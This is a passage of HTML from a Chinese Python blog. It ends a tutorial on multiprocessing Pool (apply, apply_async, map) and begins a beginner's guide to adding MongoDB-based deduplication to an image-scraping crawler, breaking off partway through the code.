                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">Started</span> <span class="string">processes</span></span><br><span class="line"><span class="attr">Start process: Start process:</span>  <span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="attr">Start process:</span>  <span class="number">2</span></span><br><span class="line"><span class="string">End</span> <span class="string">processEnd</span> <span class="string">process</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="attr">Start process:</span>  <span class="number">3</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">2</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">3</span></span><br><span class="line"><span class="string">Subprocess</span> <span class="string">done.</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以发现在这里添加三个进程进去后，立马就开始执行，不用非要等到某个进程结束后再添加新的进程进去。 下面再看看阻塞的用法：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing import Lock, Pool</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def function(index):</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'Start process: '</span>, index</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'End process'</span>, index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="built_in"> pool </span>= Pool(<span class="attribute">processes</span>=3)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(4):</span><br><span class="line">        pool.apply(function, (i,))</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Started processes"</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Subprocess done."</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里只需要把 apply_async 改成 apply 即可。 运行结果如下：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Start <span class="keyword">process</span>:  <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">process</span> <span class="number">0</span></span><br><span class="line">Start <span class="keyword">process</span>:  <span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">process</span> <span class="number">1</span></span><br><span class="line">Start <span class="keyword">process</span>:  <span class="number">2</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">process</span> <span class="number">2</span></span><br><span class="line">Start <span class="keyword">process</span>:  <span class="number">3</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">process</span> <span class="number">3</span></span><br><span class="line">Started processes</span><br><span class="line">Subprocess done.</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样一来就好理解了吧？ 下面对函数进行解释： apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞，apply(func[, args[, kwds]])是阻塞的。 close() 关闭 pool，使其不在接受新的任务。 terminate() 结束工作进程，不在处理未完成的任务。 join() 主进程阻塞，等待子进程的退出， join 方法要在 close 或 terminate 之后使用。 当然每个进程可以在各自的方法返回一个结果。apply 或 apply_async 方法可以拿到这个结果并进一步进行处理。</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing import Lock, Pool</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def function(index):</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'Start process: '</span>, index</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'End process'</span>, index</span><br><span class="line">    return index</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="built_in"> pool </span>= Pool(<span class="attribute">processes</span>=3)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(4):</span><br><span class="line">        result = pool.apply_async(function, (i,))</span><br><span class="line">        <span class="builtin-name">print</span> result.<span class="builtin-name">get</span>()</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Started processes"</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Subprocess done."</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">Start process:</span>  <span class="number">0</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="attr">Start process:</span>  <span class="number">1</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="attr">Start process:</span>  <span class="number">2</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="attr">Start process:</span>  <span class="number">3</span></span><br><span class="line"><span class="string">End</span> <span class="string">process</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="string">Started</span> <span class="string">processes</span></span><br><span class="line"><span class="string">Subprocess</span> <span class="string">done.</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>另外还有一个非常好用的 map 方法。 如果你现在有一堆数据要处理，每一项都需要经过一个方法来处理，那么 map 非常适合。 比如现在你有一个数组，包含了所有的 URL，而现在已经有了一个方法用来抓取每个 URL 内容并解析，那么可以直接在 map 的第一个参数传入方法名，第二个参数传入 URL 数组。 现在我们用一个实例来感受一下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing import Pool</span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions import ConnectionError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scrape(url):</span><br><span class="line">    try:</span><br><span class="line">        <span class="builtin-name">print</span> requests.<span class="builtin-name">get</span>(url)</span><br><span class="line">    except ConnectionError:</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">'Error Occured '</span>, url</span><br><span class="line">    finally:</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">'URL '</span>, url, <span class="string">' Scraped'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="built_in"> pool </span>= Pool(<span class="attribute">processes</span>=3)</span><br><span class="line">    urls = [</span><br><span class="line">        <span class="string">'https://www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'http://www.meituan.com/'</span>,</span><br><span class="line">        <span class="string">'http://blog.csdn.net/'</span>,</span><br><span class="line">        <span class="string">'http://xxxyxxx.net'</span></span><br><span class="line">    ]</span><br><span class="line">    pool.map(scrape, urls)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里初始化一个 Pool，指定进程数为 3，如果不指定，那么会自动根据 CPU 内核来分配进程数。 然后有一个链接列表，map 函数可以遍历每个 URL，然后对其分别执行 scrape 方法。 运行结果：</p>
                  <figure class="highlight groovy">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&lt;Response [<span class="number">403</span>]&gt;</span><br><span class="line">URL  <span class="string">http:</span><span class="comment">//blog.csdn.net/  Scraped</span></span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">URL  <span class="string">https:</span><span class="comment">//www.baidu.com  Scraped</span></span><br><span class="line">Error Occured  <span class="string">http:</span><span class="comment">//xxxyxxx.net</span></span><br><span class="line">URL  <span class="string">http:</span><span class="comment">//xxxyxxx.net  Scraped</span></span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">URL  <span class="string">http:</span><span class="comment">//www.meituan.com/  Scraped</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到遍历就这么轻松地实现了。</p>
                  <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>
                  <p>多进程 multiprocessing 相比多线程功能强大太多，而且使用范围更广，希望本文对大家有帮助！</p>
                  <h2 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h2>
                  <p><a href="https://docs.python.org/2/library/multiprocessing.html" target="_blank" rel="noopener">https://docs.python.org/2/library/multiprocessing.html</a> <a href="http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html" target="_blank" rel="noopener">http://www.cnblogs.com/vamei/archive/2012/10/12/2721484.html</a> <a href="http://www.cnblogs.com/kaituorensheng/p/4445418.html" target="_blank" rel="noopener">http://www.cnblogs.com/kaituorensheng/p/4445418.html</a> <a href="https://my.oschina.net/yangyanxing/blog/296052" target="_blank" rel="noopener">https://my.oschina.net/yangyanxing/blog/296052</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-13 20:25:32" itemprop="dateCreated datePublished" datetime="2016-11-13T20:25:32+08:00">2016-11-13</time>
                </span>
                <span id="/3335.html" class="post-meta-item leancloud_visitors" data-flag-title="Python爬虫进阶六之多进程的用法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>15k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>14 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3314.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3314.html" class="post-title-link" itemprop="url">小白爬虫第三弹之去重去重</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a> 好了！开头要说点啥，我想你们已经知道了！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" alt="QQ图片20161021224219"></a> 没错！我又来装逼了·· 前面两篇博文，不知道大家消化得怎么了。不知道各位有没注意到，前面两篇博文完成的工作，只能保证下载；你电脑不能关机，不能断网，总之不能出意外！否则啊！！！ ！！！！你就得重头开始啊！！！！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/20160124759183737.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/20160124759183737.gif" alt="20160124759183737"></a> 今天，我们来想想办法让它不重头下载；我们来记录我们已经下载过的地址！ヾ(＠⌒ ー ⌒＠)ノ这样就可以实现不重新下载啦！ 本来刚开始我是准备用本地 txt 来记录的，不过仔细一想用本地 txt 逼格不够啊！要不用 MySQL 吧！然后我自己就用了 MySQL。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" alt="QQ图片20161102215153"></a> 然而你以为我会在这教程里面用 MySQL 嘛！哈哈哈！我们来用 MongoDB！！这数据库最近很火啊！逼格直线提升啊！哈哈哈！<a href="https://www.mongodb.com" target="_blank" rel="noopener">点我去官网下载</a> 安装 mongoDB: <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/123.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/123.gif" alt="123"></a> 在 C 盘建一个用来存储数据的文件夹 MongoDB； 创建以下两个目录： C:\data\log\mongod.log 存储日志 C:\data\db 存储数据 在 C:\MongoDB 文件夹下面创建一个 mongod.cfg 的配置文件写入以下配置： 一定要取消隐藏后缀名，不然更改不会生效！</p>
                  <figure class="highlight less">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">systemLog</span>:</span><br><span class="line"> <span class="attribute">destination</span>: file</span><br><span class="line"> <span class="attribute">path</span>: <span class="attribute">C</span>:\data\log\mongod.log</span><br><span class="line"><span class="attribute">storage</span>:</span><br><span class="line"> <span class="attribute">dbPath</span>: <span class="attribute">C</span>:\data\db</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在管理员权限的 cmd 中执行以下命令将 mongoDB 安装成服务:</p>
                  <figure class="highlight taggerscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">"C:<span class="symbol">\m</span>ongodb<span class="symbol">\b</span>in<span class="symbol">\m</span>ongod.exe" --config "C:<span class="symbol">\m</span>ongodb<span class="symbol">\m</span>ongod.cfg" --install</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/安装服务.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/安装服务.gif" alt="安装服务"></a> <strong>上面两张图片是 GIF 点击是可以看到过程的哦！！！ヾ(=ﾟ･ﾟ=)ﾉ喵 ♪</strong> 服务器安装完了，CMD 启动一下： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/验证是否安装成功.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/验证是否安装成功.png" alt="验证是否安装成功"></a> 搞定！ 好啦！数据库装完了，我们来接着上一篇博文的内容继续啦！ 保险起见建议大家还是看一下 MongoDB 的基础（只需要知道那些命令是做了啥，这样就好啦！） 首先我们我们这一次需要一个模块 PyMongo；这是 Python 用来操作 MongoDB 的模块，不要担心使用起来很简单的！</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip <span class="keyword">install</span> PyMongo</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>现在我们在上一篇博文完成的代码中导入模块：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><strong>第一步：</strong> 在 class mzitu(): 下面添加这样一个函数：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">    client = MongoClient() <span class="comment">##与MongDB建立连接（这是默认连接本地MongDB数据库）</span></span><br><span class="line">    db = client[<span class="string">'meinvxiezhenji'</span>] <span class="comment">## 选择一个数据库</span></span><br><span class="line">    <span class="keyword">self</span>.meizitu_collection = db[<span class="string">'meizitu'</span>] <span class="comment">##在meizixiezhenji这个数据库中，选择一个集合</span></span><br><span class="line">    <span class="keyword">self</span>.title = <span class="string">''</span> <span class="comment">##用来保存页面主题</span></span><br><span class="line">    <span class="keyword">self</span>.url = <span class="string">''</span> <span class="comment">##用来保存页面地址</span></span><br><span class="line">    <span class="keyword">self</span>.img_urls = [] <span class="comment">##初始化一个 列表 用来保存图片地址</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好啦！第一步搞定， <strong>第二步：</strong> 我们更改一下 def all_url 函数：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">    html = down.get(url, <span class="number">3</span>)</span><br><span class="line">    all_a = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">        title = a.get_text()</span><br><span class="line">        self.title = title <span class="comment">##将主题保存到self.title中</span></span><br><span class="line">        print(<span class="string">u'开始保存：'</span>, title)</span><br><span class="line">        path = str(title).replace(<span class="string">"?"</span>, <span class="string">'_'</span>)</span><br><span class="line">        self.mkdir(path)</span><br><span class="line">        os.chdir(<span class="string">"D:\mzitu\\"</span>+path)</span><br><span class="line">        href = a[<span class="string">'href'</span>]</span><br><span class="line">        self.url = href <span class="comment">##将页面地址保存到self.url中</span></span><br><span class="line">        <span class="keyword">if</span> self.meizitu_collection.find_one(&#123;<span class="string">'主题页面'</span>: href&#125;):  <span class="comment">##判断这个主题是否已经在数据库中、不在就运行else下的内容，在则忽略。</span></span><br><span class="line">            print(<span class="string">u'这个页面已经爬取过了'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.html(href)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><strong>第三步：</strong> 我们来改一下 def html 这个函数：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def html(self, href):</span><br><span class="line">    html = down.<span class="builtin-name">get</span>(href, 3)</span><br><span class="line">    max_span = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find_all(<span class="string">'span'</span>)[10].get_text()</span><br><span class="line">    page_num = 0  ##这个当作计数器用 （用来判断图片是否下载完毕）</span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> page </span><span class="keyword">in</span> range(1, int(max_span) + 1):</span><br><span class="line">        page_num = page_num + 1 ##每<span class="keyword">for</span>循环一次就+1  （当page_num等于max_span的时候，就证明我们的在下载最后一张图片了）</span><br><span class="line">        page_url = href + <span class="string">'/'</span> + str(page)</span><br><span class="line">        self.img(page_url, max_span, page_num)  ##把上面我们我们需要的两个变量，传递给下一个函数。</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第四步： 我们来改一下 def img 这个函数：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">(self, page_url, max_span, page_num)</span>:</span> <span class="comment">##添加上面传递的参数</span></span><br><span class="line">    img_html = down.get(page_url, <span class="number">3</span>)</span><br><span class="line">    img_url = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">    self.img_urls.append(img_url) <span class="comment">##每一次 for page in range(1, int(max_span) + 1)获取到的图片地址都会添加到 img_urls这个初始化的列表</span></span><br><span class="line">    <span class="keyword">if</span> int(max_span) == page_num: <span class="comment">##我们传递下来的两个参数用上了 当max_span和Page_num相等时，就是最后一张图片了，最后一次下载图片并保存到数据库中。</span></span><br><span class="line">        self.save(img_url)</span><br><span class="line">        post = &#123;  <span class="comment">##这是构造一个字典，里面有啥都是中文，很好理解吧！</span></span><br><span class="line">            <span class="string">'标题'</span>: self.title,</span><br><span class="line">            <span class="string">'主题页面'</span>: self.url,</span><br><span class="line">            <span class="string">'图片地址'</span>: self.img_urls,</span><br><span class="line">            <span class="string">'获取时间'</span>: datetime.datetime.now()</span><br><span class="line">        &#125;</span><br><span class="line">        self.meizitu_collection.save(post) <span class="comment">##将post中的内容写入数据库。</span></span><br><span class="line">        print(<span class="string">u'插入数据库成功'</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment">##max_span 不等于 page_num执行这下面</span></span><br><span class="line">        self.save(img_url)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>self.meizitu_collection.save(post) 这个是怎么来的我要说一下，可能有点迷糊： def <strong>init</strong>(self): 函数中： client = MongoClient() db = client[‘meinvxiezhenji’] self.meizitu_collection = db[‘meizitu’] 所以意思就是：在 meizixiezhenji 这个数据库中的 meizitu 这个集合保存 post 这个字典里面的数据哦！这么解释懂了吧？ヾ(＠⌒ ー ⌒＠)ノ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021223818.jpg" alt="QQ图片20161021223818"></a> 好了、一个可以实现去重的爬虫就实现了！φ(゜ ▽ ゜*)♪ 是不是好简单 哈哈哈 顺带还存储了一堆信息（才不会告诉你们这才是我需要的呢） 好了 完整的代码贴上来了！ <strong>PS:需要先说一下 MongDB 是不需要先建数据库和集合的，会自动判断 存在则直接写入数据，不存在 则先创建需要的数据库和集合，再写入数据（是不是超爽？哈哈哈）</strong></p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Download <span class="keyword">import</span> down <span class="comment">##导入模块变了一下</span></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mzitu</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        client = MongoClient() <span class="comment">##与MongDB建立连接（这是默认连接本地MongDB数据库）</span></span><br><span class="line">        db = client[<span class="string">'meinvxiezhenji'</span>] <span class="comment">## 选择一个数据库</span></span><br><span class="line">        self.meizitu_collection = db[<span class="string">'meizitu'</span>] <span class="comment">##在meizixiezhenji这个数据库中，选择一个集合</span></span><br><span class="line">        self.title = <span class="string">''</span> <span class="comment">##用来保存页面主题</span></span><br><span class="line">        self.url = <span class="string">''</span> <span 